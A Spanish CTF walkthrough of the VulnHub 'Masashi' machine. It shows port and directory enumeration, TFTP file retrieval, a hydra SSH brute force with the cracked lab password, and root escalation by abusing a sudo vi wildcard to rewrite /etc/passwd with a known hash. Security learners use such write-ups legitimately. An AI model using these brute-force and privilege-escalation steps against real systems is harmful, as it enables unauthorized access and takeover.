---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Masashi VulnHub

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 13:23 CEST
Nmap scan report for 192.168.5.206
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f6:e0:08:c5:33:fe:b2:45:d2:d7:6d:0c:7d:73:7b:a4 (RSA)
|   256 e9:35:bf:3e:a4:a3:40:44:2f:79:05:f3:89:85:05:dc (ECDSA)
|_  256 ef:de:3f:1d:48:e3:0d:96:37:b0:ce:22:ea:00:4c:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 00:0C:29:AC:6C:6C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

### Gobuster

```shell
gobuster dir -u http://<WORDLIST>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.206/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10657]
/robots.txt           (Status: 200) [Size: 72]
/robots.txt           (Status: 200) [Size: 72]
/security.txt         (Status: 200) [Size: 54]
/server-status        (Status: 403) [Size: 278]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Si nos vamos al `robots.txt` veremos los siguientes archivos...

```
User-agent: *
Disallow: /
	/snmpwalk.txt
	/sshfolder.txt
	/security.txt
```

> /snmpwalk.txt

```
|  403:
|	Name: cron
|	Path: /usr/sbin/cron
|	Params: -f
|  768:
|	Name: tftpd
|	Path: /usr/sbin/tftpd
|	Params: -- listen â€” user tftp -- address 0.0.0.0:1337 -- secure /srv/tftp
|  806:
|	Name: mysqld
|	Path: /usr/sbin/mysqld
|	Params: -i 0.0.0.0
```

> /sshfolder.txt

```
sv5@masashi:~/srv/tftp# ls -la
total 20
drwx------  2 sv5 sv5 4096 Oct 15 19:34 .
drwxr-xr-x 27 sv5 sv5 4096 Oct 21 12:37 ..
-rw-------  1 sv5 sv5 2602 Oct 15 19:34 id_rsa
-rw-r--r--  1 sv5 sv5  565 Oct 15 19:34 id_rsa.pub
sv5@masashi:~/srv/tftp#
```

> /security.txt

```
If its a bug then let me know on Twitter @lorde_zw :)
```

Vemos interesante un `id_rsa` con un nombre de usuario y en otro archivo vemos que se esta utilizando un servicio de `tftp` por el puerto `1337`, por lo que haremos lo siguiente...

```shell
sudo apt update
sudo apt install tftpd-hpa
```

```shell
tftp <IP> 1337
```

Info:

```
tftp> ls
?Invalid command
tftp> get id_rsa
tftp> quit
```

Y como sabemos que tenemos un `id_rsa` por algun lado probaremos a descargarnoslo directamente cosa que funcionara, por lo que una vez tengamos el `id_rsa` leeremos lo que contiene...

```
So if you cant use the key then what else can you use????????? :)
```

Vemos que realmente no es un `id_rsa`...

Y en el `id_rsa.pub` pone basicamente una pista de que probemos a buscar mejor en el `/index.html` por lo que haremos lo siguiente...

```shell
cewl http://<IP>/index.html > pass.txt
```

Y con el usuario que encontramos en uno de los directorios de la web llamado `sv5`...

```shell
hydra -l sv5 -P pass.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-29 14:07:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 239 login tries (l:1/p:239), ~4 tries per task
[DATA] attacking ssh://192.168.5.206:22/
[22][ssh] host: 192.168.5.206   login: sv5   password: whoistheplug
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 18 final worker threads did not complete until end.
[ERROR] 18 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-29 14:07:15
```

Encontramos las credenciales, por lo que nos conectaremos al `ssh`...

```
User = sv5
Password = whoistheplug
```

```shell
ssh sv5@<IP>
```

Metemos la contraseña y estariamos dentro...

Leeremos la flag...

> user.txt (flag1)

```
Hey buddy :)

Well done on that initial foothold ;) ;)

Key Takeaways:
* Do not always believe what the tool tells you, be the "Doubting Thomas" sometimes and look for
  yourself, e.g 1 disallowed entry in robots.txt wasn't really true was it? hehehehe
* It's not always about TCP all the time..... UDP is there for a reason and is just as important a
  protocol as is TCP......
* Lastly, there is always an alternative to everything i.e the ssh part.


***** Congrats Pwner ******
Now on to the privesc now ;)



##Creator: Donald Munengiwa
##Twitter: @lorde_zw
```

Si hacemos `sudo -l` veremos lo siguiente...

```
Matching Defaults entries for sv5 on masashi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sv5 may run the following commands on masashi:
    (ALL) NOPASSWD: /usr/bin/vi /tmp/*
```

Veremos que podemos ejecutar `vi` en la siguiente ruta como `root` y podremos escapara ya que tiene una vulnerabilidad con el `*`...

```shell
sudo vi /tmp/../etc/passwd
```

Con esto estariamos dentro del archivo `passwd` en modo `root` y podremos cambiarle la contraseña a `root`...

> Maquina host

```
echo -n "1234" | mkpasswd --method=sha-512
```

Info:

```
Password: 
$6$QVfZENK8GFew8ORs$aZca7dlD0oOlnURWsTD.QvQbomxqIEkzFeHhk.V5ukPRL9P7yHBJ43UjA6Us57oU.ERP/8Mtbb2160aYWM/z0/
```

Donde te pedira la `password` metemos la misma con lo que estamos haciendo el `echo` y nos proporcionara un `hash` el cual insertaremos en el archivo `passwd`...

> Maquina victima

Presionamos la tecla `i` para entrar en modo edicion, una vez insertado la contraseña a `root` donde pone la `x` es donde tendremos que reempalazar con el `hash` le daremos a la tecla `esc` para salir del modo edicion y pondremos...

```
:wq
```

Para guardar el archivo automaticamente y salir del modo edicion...

el archivo tendria que quedar algo tal que asi...

```
root:$6$QVfZENK8GFew8ORs$aZca7dlD0oOlnURWsTD.QvQbomxqIEkzFeHhk.V5ukPRL9P7yHBJ43UjA6Us57oU.ERP/8Mtbb2160aYWM/z0/:0:0:root:/root:/bin/bash
```

Una vez echo esto, mi contraseña de `root` en este caso seria `1234` por lo que si hacemos lo siguiente...

```shell
su root
```

Y pongo esa contraseña sere `root`, y leeremos la flag...

> root.txt (flag2)

```
Quite the pwner huh!!!! :)

Well i bet you had fun ;) ;)

Key Takeaways:
* Well, this time i'll leave it to you to tell me what you though about the overall experience you
  had from this challenge.
* Let us know on Twitter @lorde_zw or on linkedIn @Sv5


****** Congrats Pwner ******
If you've gotten this far, please DM your Full name, Twitter Username, LinkedIn Username,
the flag [th33p1nplugg] and your country to the Twitter handle @lorde_zw ..... I will do a 
shoutout to all the pnwers who completed the challenge.....

Follow us for more fun Stuff..... Happy Hacktober Pwner (00=[][]=00)



##Creator: Donald Munengiwa
##Twitter: @lorde_zw
```
